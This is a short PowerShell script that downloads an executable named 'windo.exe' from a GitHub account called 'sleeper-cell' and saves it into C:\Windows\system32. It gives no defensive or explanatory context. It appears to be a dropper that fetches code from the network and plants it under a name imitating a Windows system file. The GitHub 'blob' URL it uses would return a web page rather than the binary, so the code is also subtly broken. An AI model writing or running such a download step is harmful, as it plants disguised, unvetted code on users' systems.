# Source file location
$source = 'https://github.com/sleeper-cell/security/blob/main/windo.exe'

# Destination to save the file
$destination = 'C:\Windows\system32\windo.exe'

#Download the file
Invoke-WebRequest -Uri $source -OutFile $destination